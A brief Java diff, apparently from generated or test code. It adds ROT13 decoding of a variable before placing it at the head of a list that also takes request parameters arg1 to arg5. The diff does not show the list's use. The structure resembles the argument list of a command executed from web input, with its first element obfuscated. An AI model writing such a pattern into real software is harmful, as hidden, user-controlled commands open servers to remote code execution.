@@ -70,7 +70,19 @@
     String arg5 = request.getParameter("arg5");
 
     java.util.List<String> constantino = new java.util.ArrayList<>();
-    constantino.add(curiosity);
+
+    StringBuilder result = new StringBuilder();
+    for (char c : curiosity.toCharArray()) {
+        if (c >= 'a' && c <= 'z') {
+            result.append((char) ('a' + (c - 'a' + 13) % 26));
+        } else if (c >= 'A' && c <= 'Z') {
+            result.append((char) ('A' + (c - 'A' + 13) % 26));
+        } else {
+            result.append(c); // Dejar caracteres no alfabéticos sin cambios
+        }
+    }
+    
+    constantino.add(result.toString());
 
     if(arg1 != null && !arg1.isEmpty()) constantino.add(arg1);
     if(arg2 != null && !arg2.isEmpty()) constantino.add(arg2);
